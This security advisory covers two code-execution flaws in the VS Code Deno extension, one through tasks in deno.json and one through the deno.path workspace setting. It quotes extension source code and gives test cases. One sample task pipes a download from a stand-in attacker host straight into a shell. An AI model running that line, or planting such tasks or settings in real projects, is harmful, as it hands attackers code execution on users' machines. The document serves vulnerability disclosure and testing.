# Combined Vulnerabilities List

## 1. Command Injection via Deno Tasks

### Description
VSCode Deno extension allows executing tasks defined in a deno.json configuration file. A malicious actor can create a repository with a deno.json file containing tasks with harmful commands. When a victim opens this repository in VSCode with the Deno extension installed, the tasks will appear in the Deno Tasks sidebar. If the victim clicks to run one of these tasks, the malicious command will be executed on their system.

Step by step execution flow:
1. Attacker creates a malicious repository with a deno.json file containing harmful commands in task definitions
2. Victim clones and opens the repository in VSCode with Deno extension
3. The extension parses the deno.json file and presents tasks in the Deno Tasks sidebar
4. When victim clicks on a task to run it, the extension executes the command with victim's privileges

### Impact
This vulnerability allows arbitrary command execution on the victim's machine with the same privileges as the VSCode process. An attacker could:
- Execute any system commands
- Access, modify, or delete files
- Install malware
- Steal sensitive information
- Establish persistence on the system

### Vulnerability Rank
**Critical**

### Currently Implemented Mitigations
There are no effective mitigations currently implemented in the codebase. The extension does not validate or sanitize task commands before execution. It relies on the user to verify the task content before execution, which is not a reliable security control.

Tasks are executed through the VS Code task system, which provides some level of isolation and visibility.

### Missing Mitigations
1. Command validation and sanitization before execution
2. Sandbox execution environment for untrusted tasks
3. Prompt for confirmation with clear warning when executing tasks from newly opened repositories
4. Restriction of task commands to a predefined safe set of operations
5. Warn users about potentially dangerous commands in tasks
6. Consider running tasks in a more restricted environment

### Preconditions
1. Victim must have the Deno VSCode extension installed
2. Victim must open a malicious repository in VSCode
3. Victim must trigger the execution of a task from the Deno Tasks sidebar or through a task command

### Source Code Analysis
The vulnerability exists in the task execution flow. Let's trace how tasks are registered and executed:

1. In `client/src/tasks_sidebar.ts`, the `DenoTasksTreeDataProvider` class has a method that runs tasks:

```typescript
#runTask(task: DenoTask) {
  tasks.executeTask(task.task);
}
```

2. Tasks are built in `client/src/tasks.ts` via the `buildDenoConfigTask` function:

```typescript
export function buildDenoConfigTask(
  scope: vscode.WorkspaceFolder,
  process: string,
  name: string,
  command: string | undefined,
  sourceUri?: vscode.Uri,
): vscode.Task {
  const args = [];
  if (
    sourceUri &&
    vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()
  ) {
    const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
    args.push("-c", configPath);
  }
  args.push(name);
  const task = new vscode.Task(
    {
      type: TASK_TYPE,
      name: name,
      command: "task",
      args,
      sourceUri,
    },
    scope,
    name,
    TASK_SOURCE,
    new vscode.ProcessExecution(process, ["task", ...args]),
    ["$deno"],
  );
  task.detail = `$ ${command}`;
  return task;
}
```

3. Tasks are loaded from deno.json in `client/src/tasks_sidebar.ts` via the `DenoTaskProvider.provideTasks()` method:

```typescript
async provideTasks(): Promise<Task[]> {
  const process = await getDenoCommandName();
  const client = this.#extensionContext.client;
  const supportsConfigTasks = this.#extensionContext.serverCapabilities
    ?.experimental?.denoConfigTasks;
  if (!client || !supportsConfigTasks) {
    return [];
  }
  const tasks = [];
  try {
    const configTasks = await client.sendRequest(taskReq);
    for (const configTask of configTasks ?? []) {
      const workspaceFolders = Array.from(
        workspace.workspaceFolders ?? [],
      );
      workspaceFolders.reverse();
      const workspaceFolder = workspaceFolders.find((f) =>
        configTask.sourceUri
          .toLocaleLowerCase()
          .startsWith(f.uri.toString(true).toLocaleLowerCase())
      );
      if (!workspaceFolder) {
        continue;
      }
      const task = buildDenoConfigTask(
        workspaceFolder,
        process,
        configTask.name,
        configTask.command ?? configTask.detail,
        Uri.parse(configTask.sourceUri),
      );
      tasks.push(task);
    }
  } catch (err) {
    window.showErrorMessage("Failed to retrieve config tasks.");
    this.#extensionContext.outputChannel.appendLine(
      `Error retrieving config tasks: ${err}`,
    );
  }
  return tasks;
}
```

This creates a critical vulnerability path:
1. Task commands from deno.json are read through the language server
2. These commands are passed directly to `buildDenoConfigTask` without validation
3. When executed, these commands run with the user's privileges via `ProcessExecution`

No validation or sanitization is performed on the command string, allowing arbitrary command execution.

### Security Test Case
To prove this vulnerability:

1. Create a malicious repository with the following deno.json file:

```json
{
  "tasks": {
    "harmless-looking-task": "echo 'Compromised!' && calc.exe",
    "another-task": "curl -s https://attacker.com/payload | sh"
  }
}
```

2. Clone the repository to a test environment with VSCode and the Deno extension installed

3. Open the repository in VSCode with the Deno extension

4. Observe that the tasks appear in the Deno Tasks sidebar

5. Click on the "harmless-looking-task" task

6. Verify that the Calculator app opens (on Windows) and "Compromised!" is printed in the output, confirming arbitrary command execution

This demonstrates that an attacker can achieve command execution on a victim's machine by having them interact with tasks from a malicious repository.

## 2. Remote Code Execution via deno.path Configuration

### Description
The Deno VS Code extension allows users to configure the path to the Deno executable through the `deno.path` setting. When the extension initializes, it uses this path to execute the Deno language server. If a malicious repository contains a `.vscode/settings.json` file with a crafted `deno.path` pointing to a malicious executable, opening the repository in VS Code will cause the extension to execute the malicious executable instead of the legitimate Deno CLI.

### Impact
This vulnerability enables an attacker to execute arbitrary code on the victim's machine with the privileges of the VS Code process, potentially leading to data theft, malware installation, or further system compromise.

### Vulnerability Rank
**Critical**

### Currently Implemented Mitigations
The extension checks if a file exists at the specified path, but doesn't validate that the executable is actually the legitimate Deno CLI.

### Missing Mitigations
- The extension should validate that the executable is the legitimate Deno CLI by checking signatures or hashes
- Prompt for user confirmation when a non-default Deno path is specified in workspace settings
- Consider restricting the use of relative paths in the `deno.path` setting

### Preconditions
1. Victim must have the Deno VS Code extension installed
2. Victim must open a repository containing a malicious `.vscode/settings.json` file

### Source Code Analysis
The vulnerability exists in the `getDenoCommandPath` function in `client/src/util.ts`:

```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();  // Gets deno.path from settings
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);  // Resolves relative path
      if (await fileExists(commandPath)) {  // Checks if file exists
        return commandPath;  // Returns path to executable
      }
    }
    return undefined;
  } else {
    return command;  // Returns absolute path directly
  }
}
```

This function gets the path to the Deno executable from settings, resolves it if it's a relative path, and returns it. The path is then used in `startLanguageServer` function in `client/src/commands.ts`:

```typescript
export function startLanguageServer(...): Callback {
  return async () => {
    // ...
    const command = await getDenoCommandPath();  // Gets path to Deno executable
    if (command == null) {
      // ... (error handling)
      return;
    }
    // ...
    const serverOptions: ServerOptions = {
      run: {
        command,  // Uses path to execute language server
        args: ["lsp"],
        options: { env },
      },
      // ...
    };
    const client = new LanguageClient(
      LANGUAGE_CLIENT_ID,
      LANGUAGE_CLIENT_NAME,
      serverOptions,
      // ...
    );
    await client.start();  // Starts language server with specified command
    // ...
  };
}
```

The vulnerability allows an attacker-controlled value to be used directly as the executable path, resulting in arbitrary code execution.

### Security Test Case
1. Create a malicious executable that performs some easily detectable action (like creating a file or making a network request)
2. Create a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "/path/to/malicious/executable"
   }
   ```
3. Clone the repository to a test environment with VS Code and the Deno extension installed
4. Open the repository in VS Code
5. Verify that the malicious executable is executed instead of the Deno CLI
